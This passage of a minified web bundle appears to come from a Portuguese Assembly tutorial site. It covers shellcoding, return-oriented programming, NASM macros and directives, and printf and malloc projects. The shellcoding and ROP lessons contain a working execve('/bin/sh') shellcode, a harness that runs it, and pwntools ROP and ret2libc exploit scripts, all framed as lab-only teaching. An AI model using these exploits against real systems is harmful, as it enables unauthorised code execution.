# Resultado desejado: No RELRO, No canary, NX disabled, No PIE`})]})}function z1(){return r.jsxs(L,{title:"Shellcoding",subtitle:"Escrever shellcode compact e null-free em Assembly",difficulty:"expert",timeToRead:"20 min",children:[r.jsx(T,{type:"danger",title:"Uso Educacional",children:"Shellcoding é uma técnica de segurança ofensiva. Use apenas em CTF, pesquisa de vulnerabilidades em sistemas próprios, ou pentesting com autorização explícita."}),r.jsxs("p",{children:[r.jsx("strong",{children:"Shellcode"})," é código de máquina autocontido que executa uma ação específica quando injetado em um processo vulnerável. O nome vem do objetivo clássico: abrir um shell (",r.jsx("code",{children:"/bin/sh"}),")."]}),r.jsx("h2",{children:"Requisitos do Shellcode"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Posição independente:"})," Funciona em qualquer endereço de memória"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Null-free:"})," Sem bytes 0x00 (strings C terminam com null, cortando o shellcode)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Compacto:"})," O menor possível"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Autocontido:"})," Não depende de endereços externos"]})]}),r.jsx("h2",{children:"Shell Simples em Assembly"}),r.jsx(d,{language:"nasm",filename:"shell_naive.asm",code:`; VERSÃO INGÊNUA — com nulls (não funciona em exploits de string):
section .text
    global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    mov rax, 59             ; syscall: execve (CONTÉM NULL! 0x00)
    lea rdi, [shell]        ; "/bin/sh"
    lea rsi, [args]         ; argv
    xor rdx, rdx            ; envp = NULL
    syscall

section .data
    shell db "/bin/sh", 0
    args  dq shell, 0

; PROBLEMA: "mov rax, 59" gera bytes: 48 B8 3B 00 00 00 00 00 00 00
;           Os zeros (0x00) vão truncar a string se injetado via strcpy!`}),r.jsx("h2",{children:"Shellcode Null-Free"}),r.jsx(d,{language:"nasm",filename:"shell_nullfree.asm",code:`; VERSÃO NULL-FREE — técnicas para evitar bytes 0x00:
; Compilar como shellcode bruto: nasm -f bin shell.asm -o shell.bin

bits 64

_start:
    ; Zerar registradores SEM zeros no código:
    xor rax, rax            ; rax = 0 (gerado como: 48 31 C0 — sem nulls)
    cdq                     ; rdx = sign_extend(eax) = 0 (se rax=0)
    
    ; Construir "/bin/sh" na stack:
    ; "/bin/sh\0" em big-endian = 0x2F62696E2F736800
    ; Mas o byte \0 no final é problemático!
    ; Truque: usar "/bin//sh" (mesmo resultado, sem null no código)
    push rax                ; push null terminator (mas rax=0 já é null!)
    ; Alternativa: usar MOVABS com valor que não termina em 0x00:
    mov rbx, 0x68732F2F6E69622F  ; "/bin//sh" reversed (little-endian)
    push rbx                ; push "/bin//sh\0" (null já está pelo push rax)
    
    mov rdi, rsp            ; rdi = &"/bin//sh"
    
    ; argv = ["/bin//sh", NULL]:
    push rax                ; NULL (segundo elemento)
    push rdi                ; ponteiro para "/bin//sh"
    mov rsi, rsp            ; rsi = argv
    
    ; execve("/bin//sh", argv, NULL):
    push 59                 ; não gera null se usarmos 'push imm8'
    pop rax                 ; rax = 59 (sem nulls no opcode!)
    ; xor rdx, rdx já foi feito com cdq
    syscall`}),r.jsx("h2",{children:"Técnicas Anti-Null"}),r.jsx(d,{language:"bash",code:`# Verificar shellcode por bytes null:
nasm -f bin shell.asm -o shell.bin
xxd shell.bin | grep "00"      # procura bytes null
objdump -d shell.bin | grep -E "0[[:space:]]*$"  # procura nulls

# Técnicas para evitar null:
# 1. XOR em vez de MOV para zerar: xor rax, rax vs mov rax, 0
# 2. PUSH imm8 + POP: push 59; pop rax  vs  mov rax, 59
# 3. CDQ para zerar RDX: se eax=0, cdq seta rdx=0
# 4. Strings XOR'd: XOR a string com chave e decode em runtime`}),r.jsx("h2",{children:"Testando Shellcode em C"}),r.jsx(d,{language:"c",filename:"test_shellcode.c",code:`// Extrair shellcode e testar:
// 1. nasm -f bin shell.asm -o shell.bin
// 2. xxd -i shell.bin    <- gera array C
// 3. compilar e executar

#include <stdio.h>
#include <string.h>

// Cole o output do 'xxd -i shell.bin' aqui:
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0x99, 0x50, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53,
    /* ... */
};
unsigned int shellcode_len = sizeof(shellcode);

int main() {
    printf("Tamanho do shellcode: %d bytes\\n", shellcode_len);
    
    // Executar shellcode como função:
    // (requer stack executável: gcc -z execstack)
    void (*func)() = (void(*)())shellcode;
    func();
    
    return 0;
}

// Compilar:
// gcc -z execstack -fno-stack-protector test_shellcode.c -o test_shellcode
// APENAS EM LABORATÓRIO!`})]})}function w1(){return r.jsxs(L,{title:"Return Oriented Programming",subtitle:"Bypassando NX/DEP com cadeias de gadgets existentes",difficulty:"expert",timeToRead:"25 min",children:[r.jsx(T,{type:"danger",title:"Uso Educacional",children:"ROP é uma técnica de pesquisa de segurança. Use apenas em CTF, labs e ambientes autorizados."}),r.jsxs("p",{children:[r.jsx("strong",{children:"Return Oriented Programming (ROP)"})," é uma técnica que permite executar código arbitrário mesmo com proteção NX (stack não executável). Em vez de injetar shellcode, encadeia pequenos trechos de código existente chamados ",r.jsx("strong",{children:"gadgets"}),"."]}),r.jsx("h2",{children:"O que são Gadgets?"}),r.jsx(d,{language:"bash",code:`# Gadget = sequência de instruções terminada em RET
# Exemplos de gadgets úteis:
#   pop rdi; ret              — carregar argumento 1
#   pop rsi; ret              — carregar argumento 2
#   pop rdx; ret              — carregar argumento 3
#   mov rax, rdi; ret         — mover registrador
#   syscall; ret              — executar syscall
#   /bin/sh em .data          — string para execve

# O atacante sobrescreve o endereço de retorno com o endereço do primeiro gadget
# Cada gadget termina em RET, que "retorna" para o próximo gadget (na stack)
# Assim, a execução "pula" de gadget em gadget — ROP chain!`}),r.jsx("h2",{children:"Procurando Gadgets"}),r.jsx(d,{language:"bash",code:`# ROPgadget — ferramenta para encontrar gadgets:
pip install ropgadget
ROPgadget --binary ./vuln --rop          # todos os gadgets
ROPgadget --binary ./vuln --string "/bin/sh"  # procura string
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi"

# Exemplos de procura:
ROPgadget --binary vuln --rop | grep "pop rdi ; ret"
# 0x00000000004012cb : pop rdi ; ret

ROPgadget --binary vuln --rop | grep "syscall"
# 0x0000000000400a85 : syscall ; ret

# Ropper (alternativa):
pip install ropper
ropper --file ./vuln --search "pop rdi"

# pwntools tem rop automático:
# rop = ROP(elf)
# rop.call(elf.plt['puts'], [elf.got['puts']])`}),r.jsx("h2",{children:"ROP Chain Simples"}),r.jsx(d,{language:"python",filename:"rop_chain.py",code:`#!/usr/bin/env python3
# Exploit ROP: execve("/bin/sh", NULL, NULL)
# Usando syscall direta — precisa dos gadgets certos!
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')

# Endereços dos gadgets (encontrados com ROPgadget):
pop_rdi  = 0x4012cb   # pop rdi; ret
pop_rsi  = 0x4012cd   # pop rsi; ret
pop_rdx  = 0x4012cf   # pop rdx; ret
pop_rax  = 0x4012d1   # pop rax; ret
syscall  = 0x400a85   # syscall; ret
bin_sh   = 0x601060   # endereço de "/bin/sh" no binário (ou em libc)

# Offset até o endereço de retorno:
offset = 72

# Construir ROP chain:
rop_chain  = b'A' * offset          # padding
rop_chain += p64(pop_rdi)           # pop rdi; ret
rop_chain += p64(bin_sh)            #   rdi = &"/bin/sh"
rop_chain += p64(pop_rsi)           # pop rsi; ret
rop_chain += p64(0)                 #   rsi = NULL
rop_chain += p64(pop_rdx)           # pop rdx; ret
rop_chain += p64(0)                 #   rdx = NULL
rop_chain += p64(pop_rax)           # pop rax; ret
rop_chain += p64(59)                #   rax = 59 (execve)
rop_chain += p64(syscall)           # syscall

print(f"ROP chain length: {len(rop_chain)}")

p = process('./vuln')
p.sendline(rop_chain)
p.interactive()`}),r.jsx("h2",{children:"ret2libc — Usando Funções da libc"}),r.jsx(d,{language:"python",filename:"ret2libc.py",code:`# ret2libc: chamar system("/bin/sh") da libc
# Não precisa de syscall gadget — usa função C da libc

from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Com ASLR, precisamos vazar um endereço da libc primeiro:
# 1. Usar puts@plt para imprimir puts@got (vaza endereço real de puts)
# 2. Calcular base da libc: base = puts_leaked - libc.symbols['puts']
# 3. Calcular endereços reais de system e /bin/sh

# Gadgets:
pop_rdi = next(elf.search(asm('pop rdi; ret')))
ret_gadget = next(elf.search(asm('ret')))  # para alinhamento

# Fase 1: leak do puts:
payload1  = b'A' * 72
payload1 += p64(pop_rdi) + p64(elf.got['puts'])  # arg: &puts_got
payload1 += p64(elf.plt['puts'])                  # call puts
payload1 += p64(elf.symbols['main'])              # retornar ao main

p.sendline(payload1)
puts_leaked = u64(p.recv(6).ljust(8, b'\\x00'))
libc.address = puts_leaked - libc.symbols['puts']
print(f"[*] libc base: {hex(libc.address)}")

# Fase 2: chamar system("/bin/sh"):
bin_sh = next(libc.search(b'/bin/sh'))
payload2  = b'A' * 72
payload2 += p64(ret_gadget)   # alinhamento de 16 bytes para stack
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()`}),r.jsx(T,{type:"info",title:"Defesas contra ROP",children:"Control Flow Integrity (CFI), Shadow Stack (Intel CET), ASLR e PIE dificultam ROP. A Intel introduziu o CET (Control-flow Enforcement Technology) nos processadores Tiger Lake, que usa hardware para verificar que RET sempre retorna para um endereço de CALL legítimo."})]})}function X1(){return r.jsxs(L,{title:"Macros em NASM",subtitle:"Automatizando código repetitivo com o preprocessador do NASM",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsx("p",{children:"NASM tem um sistema de macros poderoso que permite criar abstrações reutilizáveis e reduzir código repetitivo. Macros são expandidas pelo montador antes da geração de código."}),r.jsx("h2",{children:"Macros Simples (%define)"}),r.jsx(d,{language:"nasm",filename:"macros.asm",code:`; %define — substituição de texto simples (como #define do C):
%define STDIN  0
%define STDOUT 1
%define STDERR 2
%define SYS_READ  0
%define SYS_WRITE 1
%define SYS_EXIT  60

; Usar as constantes:
    mov rax, SYS_WRITE
    mov rdi, STDOUT
    ; ...

; Macros com argumentos:
%define MAX(a, b)  ((a) > (b) ? (a) : (b))   ; só funciona em contextos de expressão
%define OFFSET_OF(tipo, campo)  tipo %+ _ %+ campo  ; concatenação

; Redefinir macros:
%define DEBUG_MSG(msg)  push rdi %n lea rdi, [msg] %n call print_debug %n pop rdi`}),r.jsx("h2",{children:"Macros Multilinhas (%macro)"}),r.jsx(d,{language:"nasm",filename:"macro_multi.asm",code:`; %macro nome num_args ... %endmacro
; %1, %2, ... = argumentos
; %0 = número de argumentos

; Macro sem argumentos:
%macro PROLOGUE 0
    push rbp
    mov  rbp, rsp
%endmacro

%macro EPILOGUE 0
    leave
    ret
%endmacro

; Macro com argumentos — chamar syscall:
%macro SYSCALL1 2       ; 2 argumentos: número e 1º argumento
    mov rax, %1
    mov rdi, %2
    syscall
%endmacro

%macro SYSCALL3 4       ; 4 args: número + 3 argumentos
    mov rax, %1
    mov rdi, %2
    mov rsi, %3
    mov rdx, %4
    syscall
%endmacro

; Usar:
    PROLOGUE
    SYSCALL3 SYS_WRITE, STDOUT, msg, msg_len
    EPILOGUE

; Macro para imprimir string literal:
%macro PRINT 1
    section .rodata
    %%str db %1, 10      ; %%str = label local único por expansão!
    %%len equ $ - %%str
    section .text
    mov rax, SYS_WRITE
    mov rdi, STDOUT
    lea rsi, [%%str]
    mov rdx, %%len
    syscall
%endmacro

    PRINT "Hello, Macro World!"`}),r.jsx("h2",{children:"Labels Locais em Macros"}),r.jsx(d,{language:"nasm",filename:"local_labels.asm",code:`; %% gera labels únicos para evitar conflitos:
%macro LOOP_N 1         ; %1 = número de iterações
    mov rcx, %1
%%loop_start:
    ; ... corpo do loop ...
    dec rcx
    jnz %%loop_start    ; %%loop_start é único para cada expansão
%endmacro

; Usar múltiplas vezes sem conflito de labels:
    LOOP_N 10    ; gera %%loop_start_1
    LOOP_N 20    ; gera %%loop_start_2 (label diferente!)`}),r.jsx("h2",{children:"Condicional em Macros"}),r.jsx(d,{language:"nasm",filename:"macro_cond.asm",code:`; %if, %elif, %else, %endif
%define DEBUG 1

%if DEBUG == 1
    %macro LOG 1
        push rsi
        push rdi
        push rax
        lea rdi, [%%label]
        call debug_print
        pop rax
        pop rdi
        pop rsi
        jmp %%skip
    %%label db %1, 0
    %%skip:
    %endmacro
%else
    %macro LOG 1
    %endmacro              ; versão vazia em release
%endif

; %ifdef / %ifndef — verificar se macro está definida:
%ifndef ARCH
    %define ARCH 64
%endif

%if ARCH == 64
    %define REG_SIZE 8
    %define PTR_SIZE 8
%else
    %define REG_SIZE 4
    %define PTR_SIZE 4
%endif`}),r.jsx("h2",{children:"Macros Recursivas"}),r.jsx(d,{language:"nasm",filename:"macro_rec.asm",code:`; Macro para gerar múltiplos NOPs:
%macro NOP_N 1
    %rep %1
        nop
    %endrep
%endmacro

    NOP_N 5              ; gera 5 instruções NOP

; %rep com %repcount:
    %assign i 0
    %rep 8
        db i
        %assign i i+1
    %endrep              ; gera: db 0, 1, 2, 3, 4, 5, 6, 7

; Gerar uma tabela de potências de 2:
    %assign val 1
    %rep 16
        dq val
        %assign val val * 2
    %endrep`}),r.jsx(T,{type:"info",title:"Macros vs Funções",children:"Macros são expandidas em cada uso (duplicam código). Funções são chamadas com CALL (overhead de stack frame mas código compartilhado). Use macros para código muito pequeno e frequente; use funções para lógica maior."})]})}function B1(){return r.jsxs(L,{title:"Diretivas do NASM",subtitle:"Comandos de controle do montador: seções, alinhamento e mais",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsxs("p",{children:["Diretivas são instruções para o ",r.jsx("strong",{children:"montador"})," (não para o processador). Elas controlam como o código é organizado, alinhado e gerado."]}),r.jsx("h2",{children:"Diretivas de Seção"}),r.jsx(d,{language:"nasm",filename:"secoes.asm",code:`; Mudar para seção .text (código):
section .text
    global _start
_start:
    ; código aqui

; Mudar para seção .data (dados inicializados):
section .data
    msg db "Hello", 10, 0
    num dq 42
    pi  dq 3.14159

; Mudar para seção .rodata (dados somente leitura):
section .rodata
    CONST_PI  dq 3.14159265358979
    ERROR_STR db "Erro: ", 0

; Mudar para seção .bss (dados não inicializados):
section .bss
    buffer resb 1024
    counter resq 1`}),r.jsx("h2",{children:"Definição de Dados"}),r.jsx(d,{language:"nasm",filename:"dados.asm",code:`section .data
    ; Define Byte — 8 bits:
    b1  db 0xFF             ; 1 byte = 255
    b2  db 'A'              ; 1 byte = 65 (código ASCII)
    b3  db "Hello", 0       ; 6 bytes: 72 65 6C 6C 6F 00
    b4  db 1, 2, 3, 4, 5    ; 5 bytes

    ; Define Word — 16 bits:
    w1  dw 0x1234           ; 2 bytes: 34 12 (little-endian!)
    w2  dw 65535            ; 2 bytes

    ; Define DWord — 32 bits:
    d1  dd 0x12345678       ; 4 bytes
    d2  dd 3.14             ; 4 bytes, float IEEE 754

    ; Define QWord — 64 bits:
    q1  dq 0x123456789ABCDEF0  ; 8 bytes
    q2  dq 3.141592653589793   ; 8 bytes, double IEEE 754

    ; TIMES — repetição:
    zeros times 100 db 0    ; 100 bytes de zero
    magic times 4 dd 0xDEADBEEF ; 4 DWORDs

section .bss
    ; Reserve Byte/Word/DWord/QWord:
    buf1 resb 256           ; 256 bytes
    buf2 resw 128           ; 128 words = 256 bytes
    buf3 resd 64            ; 64 dwords = 256 bytes
    buf4 resq 32            ; 32 qwords = 256 bytes`}),r.jsx("h2",{children:"Constantes EQU"}),r.jsx(d,{language:"nasm",filename:"equ.asm",code:`; EQU — constante de compilação (não aloca memória!)
STDIN          equ 0
STDOUT         equ 1
STDERR         equ 2
PAGE_SIZE      equ 4096
BUFFER_SIZE    equ PAGE_SIZE * 4    ; expressões são avaliadas!
MAX_FILES      equ 1024

; Diferença entre EQU e definir na memória:
A  equ 42         ; A é uma constante (valor 42, sem endereço)
B  dq 42          ; B é uma variável de 8 bytes com valor 42

; Usar:
    mov rax, A    ; rax = 42 (literal)
    mov rax, [B]  ; rax = conteúdo de B (lê da memória)`}),r.jsx("h2",{children:"Diretivas de Alinhamento"}),r.jsx(d,{language:"nasm",filename:"align.asm",code:`; ALIGN N — alinha para próximo múltiplo de N
; Insere bytes de padding (NOP para .text, zeros para .data)

section .text
    align 16             ; alinha para 16 bytes (bom para loops)
.loop:
    ; ... código ...

section .data
    align 4              ; alinha variável de 4 bytes a 4 bytes
    intvar  dd 42

    align 8              ; alinha de 8 bytes a 8 bytes
    longvar dq 100

    align 16             ; alinha para SSE (128-bit)
    xmmdata dq 1.0, 2.0

    align 32             ; alinha para AVX (256-bit)
    ymmdata times 8 dd 1.0`}),r.jsx("h2",{children:"Controle de Arquivos"}),r.jsx(d,{language:"nasm",filename:"includes.asm",code:`; Incluir outro arquivo:
%include "defines.inc"
%include "macros.inc"

; Diretivas de formato:
bits 16              ; gerar código de 16 bits (modo real)
bits 32              ; gerar código de 32 bits (modo protegido)
bits 64              ; gerar código de 64 bits (padrão no Linux)

; Especificar formato de saída (apenas no arquivo principal):
; (na linha de comando: nasm -f elf64 arquivo.asm)

; Controle de warning:
[warning -macro-defaults]  ; desativar aviso específico

; Posição de origem:
org 0x7C00           ; para bootloaders — diz ao NASM onde o código será carregado
; $ = posição atual
; $$ = início da seção atual
; $ - $$ = offset dentro da seção`}),r.jsx("h2",{children:"Diretivas de Exportação"}),r.jsx(d,{language:"nasm",filename:"export.asm",code:`; GLOBAL — exportar símbolo (visível ao linker):
global _start           ; ponto de entrada
global minha_funcao     ; exportar função
global variavel_publica ; exportar variável

; EXTERN — importar símbolo de outro módulo:
extern printf
extern malloc
extern free

; Exemplo completo:
section .text
    global funcao_publica
    extern funcao_privada_em_outro_modulo

funcao_publica:
    call funcao_privada_em_outro_modulo
    ret`})]})}function P1(){return r.jsxs(L,{title:"Preprocessamento NASM",subtitle:"Incluir arquivos, condicionais e geração de código automática",difficulty:"intermediario",timeToRead:"10 min",children:[r.jsx("p",{children:"O preprocessador do NASM oferece recursos para organizar código em múltiplos arquivos, geração condicional de código e macros avançadas — similar ao CPP do C mas específico para Assembly."}),r.jsx("h2",{children:"Incluindo Arquivos"}),r.jsx(d,{language:"nasm",filename:"main.asm",code:`; Incluir arquivo em tempo de compilação:
%include "defines.inc"      ; constantes e macros
%include "syscalls.inc"     ; wrappers de syscall
%include "utils.inc"        ; funções utilitárias

; Incluir apenas uma vez (guardas de inclusão):
%ifndef DEFINES_INC
%define DEFINES_INC
; ... conteúdo do defines.inc ...
%endif`}),r.jsx(d,{language:"nasm",filename:"defines.inc",code:`; defines.inc — constantes e macros comuns

; Syscalls Linux x86-64:
%define SYS_READ    0
%define SYS_WRITE   1
%define SYS_OPEN    2
%define SYS_CLOSE   3
%define SYS_EXIT    60

; File descriptors padrão:
%define STDIN   0
%define STDOUT  1
%define STDERR  2

; Proteções de memória:
%define PROT_READ  1
%define PROT_WRITE 2
%define PROT_EXEC  4

; Macros de syscall:
%macro WRITE 3              ; fd, buf, len
    mov rax, SYS_WRITE
    mov rdi, %1
    mov rsi, %2
    mov rdx, %3
    syscall
%endmacro

%macro EXIT 1
    mov rax, SYS_EXIT
    mov rdi, %1
    syscall
%endmacro`}),r.jsx("h2",{children:"Compilação Condicional"}),r.jsx(d,{language:"nasm",filename:"condicional.asm",code:`; Definir na linha de comando: nasm -DDEBUG=1 arquivo.asm

%ifdef DEBUG
    %define LOG_LEVEL 3
%elifdef RELEASE
    %define LOG_LEVEL 0
%else
    %define LOG_LEVEL 1
%endif

; Código condicional:
%if LOG_LEVEL > 0
    %macro DEBUG_LOG 1
        ; ... código de log ...
    %endmacro
%else
    %macro DEBUG_LOG 1
        ; versão vazia — sem overhead em release
    %endmacro
%endif

; Verificar arquitetura:
%ifdef __BITS__ == 64
    ; código 64-bit
%elif __BITS__ == 32
    ; código 32-bit  
%endif`}),r.jsx("h2",{children:"Geração de Código com %rep"}),r.jsx(d,{language:"nasm",filename:"geracao.asm",code:`; Gerar tabela de senos (simplificado):
section .data
    align 16

; Gerar tabela de Fibonacci:
section .data
fibonacci_table:
    %assign a 0
    %assign b 1
    %rep 20
        dq a
        %assign temp b
        %assign b (a + b)
        %assign a temp
    %endrep
; Gera: 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, ...

; Tabela de potências de 2:
section .data
pow2_table:
    %assign val 1
    %rep 64
        dq val
        %assign val (val * 2)
    %endrep

; Unroll de loop em compile-time:
section .text
%assign i 0
%rep 8
    mov rax, [rdi + i*8]
    add [rsi + i*8], rax
    %assign i (i + 1)
%endrep`}),r.jsx("h2",{children:"Operações de String no Preprocessador"}),r.jsx(d,{language:"nasm",filename:"str_preproc.asm",code:`; Concatenação de tokens (%+):
%define PREFIX_ mylib_
%define FUNC(name) PREFIX_ %+ name

FUNC(init):     ; → mylib_init:
    ret

; Conversão de string:
%define STRINGIZE(x) #x   ; (NASM não tem isso, use %+ diretamente)

; Contagem de argumentos (%0):
%macro DEBUG_N 0-*
    mov rax, %0   ; número de argumentos passados
%endmacro

DEBUG_N 1, 2, 3    ; rax = 3`})]})}function U1(){return r.jsxs(L,{title:"Projeto: Printf Próprio",subtitle:"Implementar printf do zero em Assembly puro",difficulty:"expert",timeToRead:"30 min",children:[r.jsx("p",{children:"Implementar um printf simplificado em Assembly é um excelente projeto para consolidar conhecimentos de funções variádicas, strings, conversão de tipos e syscalls."}),r.jsxs(T,{type:"info",title:"Objetivo",children:["Ao final deste projeto, você terá implementado: ",r.jsx("code",{children:"myprintf(fmt, ...)"})," suportando %d, %s, %c, %x, %% com tamanho correto."]}),r.jsx("h2",{children:"Estrutura do Projeto"}),r.jsx(d,{language:"bash",code:`myprintf/
├── myprintf.asm    — implementação principal
├── utils.asm       — funções auxiliares (itoa, strlen)
├── main.c          — programa de teste (chama myprintf de C)
└── Makefile`}),r.jsx("h2",{children:"Funções Auxiliares"}),r.jsx(d,{language:"nasm",filename:"utils.asm",code:`; utils.asm — utilitários para myprintf

section .text
    global strlen_asm
    global itoa_dec
    global itoa_hex
    global my_write

; strlen_asm(char *s) → size_t
strlen_asm:
    xor rax, rax
.loop:
    cmp byte [rdi + rax], 0
    je  .fim
    inc rax
    jmp .loop
.fim:
    ret

; my_write(int fd, const char *buf, size_t len) → void
my_write:
    ; rdi=fd, rsi=buf, rdx=len
    push rdi
    push rsi
    push rdx
    mov rax, 1          ; sys_write
    syscall
    pop rdx
    pop rsi
    pop rdi
    ret

; itoa_dec — converte inteiro de 64-bit para string decimal
; Entrada: rdi = número (signed), rsi = buffer (pelo menos 21 bytes)
; Saída: rax = ponteiro para início da string no buffer
itoa_dec:
    push rbx
    push r12
    push r13

    mov rbx, rdi        ; rbx = número
    lea r12, [rsi + 20] ; r12 = fim do buffer
    mov byte [r12], 0   ; null terminator
    dec r12

    ; Verificar se negativo:
    mov r13, 0          ; r13 = flag negativo
    test rbx, rbx
    jns .positive
    neg rbx             ; |número|
    mov r13, 1

.positive:
    ; Converter dígitos (da direita para esquerda):
    mov rcx, 10
.loop:
    xor rdx, rdx
    div rcx             ; rax = quotient, rdx = remainder
    ; Oops — div usa rax implicitamente, precisamos ajustar:
    ; (veja versão correta abaixo)
    mov [r12], dl       ; dígito
    add byte [r12], '0' ; converter para ASCII
    dec r12
    test rax, rax
    jnz .loop

    ; Adicionar sinal negativo:
    test r13, r13
    jz .no_neg
    mov byte [r12], '-'
    dec r12
.no_neg:
    inc r12             ; rax = início da string
    mov rax, r12

    pop r13
    pop r12
    pop rbx
    ret`}),r.jsx("h2",{children:"Implementação Principal"}),r.jsx(d,{language:"nasm",filename:"myprintf.asm",code:`; myprintf.asm — printf simplificado
; Suporta: %d, %s, %c, %x, %%
; Prototype: int myprintf(const char *fmt, ...)
; ABI: rdi=fmt, rsi=arg1, rdx=arg2, rcx=arg3, r8=arg4, r9=arg5

section .bss
    ibuf resb 32        ; buffer para itoa

section .text
    global myprintf
    extern strlen_asm
    extern my_write
    extern itoa_dec

myprintf:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; Salvar argumentos variádicos (após fmt = rdi):
    ; Segundo argumento em rsi, terceiro em rdx, etc.
    ; Simplificação: salvar numa estrutura na stack
    sub rsp, 56
    mov [rsp + 0],  rsi    ; arg1
    mov [rsp + 8],  rdx    ; arg2
    mov [rsp + 16], rcx    ; arg3
    mov [rsp + 24], r8     ; arg4
    mov [rsp + 32], r9     ; arg5

    mov r12, rdi            ; r12 = fmt (ponteiro atual)
    xor r13, r13            ; r13 = índice do próximo argumento
    xor r14, r14            ; r14 = bytes escritos

.loop:
    ; Ler próximo caractere:
    movzx rbx, byte [r12]   ; rbx = *fmt
    test bl, bl
    jz .fim

    cmp bl, '%'
    jne .literal

    ; Processar especificador de formato:
    inc r12                  ; avançar past '%'
    movzx rbx, byte [r12]   ; rbx = especificador

    cmp bl, 'd'
    je  .fmt_d
    cmp bl, 's'
    je  .fmt_s
    cmp bl, 'c'
    je  .fmt_c
    cmp bl, 'x'
    je  .fmt_x
    cmp bl, '%'
    je  .fmt_percent
    jmp .literal

.fmt_d:
    ; Pegar próximo argumento inteiro:
    mov rdi, [rsp + r13*8]
    inc r13
    ; Converter para string decimal:
    lea rsi, [ibuf]
    call itoa_dec           ; rax = ponteiro para string
    ; Imprimir:
    mov rdi, rax
    call strlen_asm         ; rax = comprimento
    mov rdx, rax
    mov rsi, rdi
    mov rdi, 1              ; fd = stdout
    call my_write
    jmp .next

.fmt_s:
    mov rdi, [rsp + r13*8]  ; rdi = ponteiro para string
    inc r13
    call strlen_asm
    mov rdx, rax
    mov rsi, rdi
    mov rdi, 1
    call my_write
    jmp .next

.fmt_c:
    mov rbx, [rsp + r13*8]  ; caractere
    inc r13
    ; Imprimir 1 byte:
    lea rsi, [rbx]          ; endereço do byte
    ; (simplificado — precisa salvar na stack)
    push rbx
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 1
    mov rax, 1
    syscall
    pop rbx
    jmp .next

.fmt_x:
    ; Hexadecimal (similar ao decimal, base 16)
    ; ... implementação similar ao %d
    jmp .next

.fmt_percent:
    ; Imprimir '%' literal:
.literal:
    ; Imprimir um caractere:
    push rbx
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 1
    mov rax, 1
    syscall
    pop rbx

.next:
    inc r12
    jmp .loop

.fim:
    add rsp, 56
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret`}),r.jsx(d,{language:"bash",code:`# Compilar e testar:
nasm -f elf64 myprintf.asm -o myprintf.o
nasm -f elf64 utils.asm -o utils.o
gcc main.c myprintf.o utils.o -o myprintf_test
./myprintf_test

# main.c de teste:
# extern void myprintf(const char *fmt, ...);
# int main() {
#   myprintf("Int: %d, Str: %s, Char: %c\\n", 42, "ola", 'X');
#   return 0;
# }`})]})}function I1(){return r.jsxs(L,{title:"Projeto: Malloc Próprio",subtitle:"Implementar um alocador de memória simples em Assembly",difficulty:"expert",timeToRead:"25 min",children:[r.jsx("p",{children:"Implementar um alocador de memória (malloc/free) em Assembly é um projeto avançado que demonstra gerenciamento de heap, estruturas de dados e syscalls de forma integrada."}),r.jsx("h2",{children:"Estratégia: First-Fit com Free List"}),r.jsx(d,{language:"bash",code:`# Layout do nosso heap:
# Cada bloco tem um header:
# [size (8 bytes) | flags (8 bytes) | dados ...]
#
# flags bit 0: 1 = livre, 0 = alocado
#
# O heap cresce via sys_brk
# A "free list" é uma lista ligada implícita de blocos livres
# Algoritmo: First-Fit (primeiro bloco livre que cabe)`}),r.jsx("h2",{children:"Inicialização e BRK"}),r.jsx(d,{language:"nasm",filename:"mymalloc.asm",code:`; mymalloc.asm — alocador de memória simples

HEADER_SIZE equ 16      ; 8 bytes size + 8 bytes flags
FLAG_FREE   equ 1       ; bit 0 = livre

section .bss
    heap_start  resq 1  ; início do heap
    heap_end    resq 1  ; fim atual do heap

section .text
    global my_malloc
    global my_free

; Inicializar o heap (chamado automaticamente na primeira alocação):
init_heap:
    cmp qword [heap_start], 0
    jne .already_inited

    ; sys_brk(0) retorna o início do heap:
    mov rax, 12         ; sys_brk
    xor rdi, rdi        ; addr = 0 → retorna brk atual
    syscall
    mov [heap_start], rax
    mov [heap_end], rax
.already_inited:
    ret

; Expandir o heap por N bytes:
; Entrada: rdi = bytes a adicionar
; Saída: rax = ponteiro para nova área (ou -1 se falhar)
expand_heap:
    mov rax, [heap_end]     ; rax = brk atual
    add rax, rdi            ; rax = novo brk desejado
    
    ; sys_brk(novo_brk):
    mov rdi, rax
    mov rax, 12
    syscall
    
    ; Verificar se expandiu corretamente:
    cmp rax, rdi
    jne .falhou
    
    ; Salvar novo heap_end:
    mov [heap_end], rax
    ret
.falhou:
    mov rax, -1
    ret

; my_malloc(size_t size) → void*
; Entrada: rdi = tamanho solicitado
; Saída: rax = ponteiro para dados (ou NULL se falhar)
my_malloc:
    push rbx
    push r12
    
    call init_heap
    
    ; Alinhar tamanho para 8 bytes:
    add rdi, 7
    and rdi, ~7             ; rdi = aligned size
    
    mov r12, rdi            ; salvar tamanho
    
    ; Procurar bloco livre (first-fit):
    mov rbx, [heap_start]
.search:
    cmp rbx, [heap_end]
    jge .nao_encontrou
    
    ; Verificar se bloco é livre E grande o suficiente:
    test qword [rbx + 8], FLAG_FREE
    jz  .proximo            ; não é livre
    
    cmp qword [rbx], r12    ; tamanho >= solicitado?
    jl  .proximo
    
    ; ENCONTROU bloco livre!
    ; Marcar como alocado:
    and qword [rbx + 8], ~FLAG_FREE
    
